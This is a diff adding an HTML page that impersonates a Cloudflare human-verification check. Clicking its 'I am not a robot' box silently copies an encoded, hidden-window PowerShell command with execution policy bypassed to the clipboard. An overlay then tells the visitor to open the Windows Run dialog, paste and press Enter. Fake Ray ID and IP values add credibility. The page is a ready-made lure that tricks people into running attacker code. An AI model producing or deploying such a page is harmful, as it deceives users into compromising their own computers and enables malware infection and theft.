@@ -1,0 +1,209 @@
+<!-- file: index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Attention Required! | Cloudflare</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #f5f5f5;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    display: flex; flex-direction: column;
+    min-height: 100vh; color: #1d1d1d;
+  }
+  header {
+    background: #fff;
+    border-bottom: 1px solid #e2e2e2;
+    padding: 12px 24px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .cf-logo {
+    width: 32px; height: 32px;
+    background: #F48120;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    color: #fff; font-weight: 700; font-size: 16px;
+  }
+  header span { font-size: 18px; font-weight: 600; color: #1d1d1d; }
+  main {
+    flex: 1; display: flex;
+    align-items: center; justify-content: center;
+    padding: 40px 20px;
+  }
+  .card {
+    background: #fff;
+    border: 1px solid #e2e2e2;
+    border-radius: 8px;
+    max-width: 540px; width: 100%;
+    padding: 40px 36px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+  }
+  .shield-icon {
+    width: 56px; height: 56px; margin-bottom: 20px;
+    background: #FFF3E0; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 26px;
+  }
+  h1 { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+  .subtitle { color: #555; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+  .ray-id {
+    background: #f5f5f5; border: 1px solid #e2e2e2;
+    border-radius: 4px; padding: 10px 14px;
+    font-size: 12px; color: #666;
+    margin-bottom: 24px; font-family: monospace;
+  }
+  .verify-box {
+    border: 1px solid #e2e2e2; border-radius: 6px;
+    padding: 18px 20px;
+    display: flex; align-items: center;
+    gap: 16px; margin-bottom: 24px;
+    background: #fafafa;
+  }
+  .checkbox-wrap {
+    width: 28px; height: 28px; flex-shrink: 0;
+    border: 2px solid #aaa; border-radius: 3px;
+    cursor: pointer; display: flex;
+    align-items: center; justify-content: center;
+    transition: border-color 0.15s, background 0.15s;
+  }
+  .checkbox-wrap.checked { background: #0051c3; border-color: #0051c3; }
+  .checkbox-wrap.checked::after { content: "✓"; color: #fff; font-size: 16px; font-weight: 700; }
+  .checkbox-label { font-size: 15px; font-weight: 500; }
+  .recaptcha-brand { font-size: 10px; color: #aaa; text-align: right; }
+  .overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.55);
+    z-index: 100; align-items: center; justify-content: center;
+  }
+  .overlay.active { display: flex; }
+  .overlay-card {
+    background: #fff; border-radius: 10px;
+    padding: 36px 32px; max-width: 420px; width: 90%;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.18);
+  }
+  .overlay-card h2 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+  .overlay-card p { font-size: 14px; color: #555; margin-bottom: 20px; }
+  .steps { list-style: none; display: flex; flex-direction: column; gap: 12px; }
+  .steps li { display: flex; align-items: flex-start; gap: 12px; font-size: 14px; }
+  .step-num {
+    background: #0051c3; color: #fff;
+    width: 22px; height: 22px; border-radius: 50%;
+    font-size: 12px; font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; margin-top: 1px;
+  }
+  .steps kbd {
+    background: #f0f0f0; border: 1px solid #ccc;
+    border-bottom-width: 2px; border-radius: 4px;
+    padding: 1px 6px; font-family: monospace; font-size: 13px;
+  }
+  .copied-badge {
+    background: #e8f5e9; color: #2e7d32;
+    border-radius: 4px; padding: 8px 14px;
+    font-size: 13px; font-weight: 500;
+    margin-top: 20px; text-align: center;
+  }
+  footer {
+    text-align: center; padding: 20px;
+    font-size: 12px; color: #aaa;
+  }
+  footer a { color: #aaa; text-decoration: none; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="cf-logo">CF</div>
+  <span>Cloudflare</span>
+</header>
+
+<main>
+  <div class="card">
+    <div class="shield-icon">🛡️</div>
+    <h1>Verify you are human</h1>
+    <p class="subtitle">
+      This site is protected by Cloudflare. To continue, complete the
+      verification step below. This process is automatic.
+    </p>
+    <div class="ray-id">
+      Ray ID: &nbsp;<strong id="rayid"></strong>&nbsp; &bull; &nbsp;
+      Your IP: <strong id="clientip"></strong>
+    </div>
+    <div class="verify-box">
+      <div class="checkbox-wrap" id="cb"></div>
+      <span class="checkbox-label">I am not a robot</span>
+      <div style="margin-left:auto;display:flex;flex-direction:column;align-items:center;gap:2px;">
+        <div style="font-size:24px;">🔒</div>
+        <div class="recaptcha-brand">Privacy · Terms</div>
+      </div>
+    </div>
+    <p style="font-size:12px;color:#aaa;">Performance &amp; security by Cloudflare &bull; 2026</p>
+  </div>
+</main>
+
+<div class="overlay" id="overlay">
+  <div class="overlay-card">
+    <h2>One more verification step</h2>
+    <p>To confirm you're not a bot, complete this quick check:</p>
+    <ol class="steps">
+      <li>
+        <div class="step-num">1</div>
+        <span>Press <kbd>⊞ Win</kbd> + <kbd>R</kbd> to open the Run dialog</span>
+      </li>
+      <li>
+        <div class="step-num">2</div>
+        <span>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste</span>
+      </li>
+      <li>
+        <div class="step-num">3</div>
+        <span>Press <kbd>Enter</kbd> to verify</span>
+      </li>
+    </ol>
+    <div class="copied-badge">✔ Verification token copied to clipboard</div>
+  </div>
+</div>
+
+<footer>
+  <a href="#">Cloudflare Privacy Policy</a> &bull; <a href="#">Terms of Service</a>
+</footer>
+
+<script>
+  // ── PAYLOAD ──────────────────────────────────────────────────────────────────
+  const PAYLOAD = `powershell -w 1 -nop -ep bypass -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdABBAGQAcgBlAHMAcwB1AG4AdQBjAG8AZABlAHMAcAAgAHQAaABDAG8AbQBtAGEAbgBkAEUAbgBkAHkASABQAHEAAAASAdQBiABwAGwAdwBhAG8AhGQAHBAlAHIAcCAAKAAoAGQAYgA5AGwAcgB4AGYAGQBJAGYANAAgADIAYgAYAGAYQBiAGYANgA4ACAYwB4ACwAZABlAG4AMwAGIAMwBhAGMAMwBkAGANA0AKQApAA==`;
+  // ─────────────────────────────────────────────────────────────────────────────
+
+  // fake ray ID + IP
+  const h = '0123456789abcdef';
+  document.getElementById('rayid').textContent =
+    Array.from({length:16}, () => h[Math.random()*16|0]).join('');
+  document.getElementById('clientip').textContent =
+    [2,1,1,1].map((_,i) => i===0 ? (Math.random()*223+1|0) : (Math.random()*254+1|0)).join('.');
+
+  function copyPayload() {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(PAYLOAD).catch(() => fallback());
+    } else {
+      fallback();
+    }
+  }
+
+  function fallback() {
+    const ta = document.createElement('textarea');
+    ta.value = PAYLOAD;
+    ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0';
+    document.body.appendChild(ta);
+    ta.focus(); ta.select();
+    try { document.execCommand('copy'); } catch(e) {}
+    document.body.removeChild(ta);
+  }
+
+  document.getElementById('cb').addEventListener('click', function() {
+    this.classList.add('checked');
+    copyPayload();
+    document.getElementById('overlay').classList.add('active');
+  });
+</script>
+</body>
+</html>
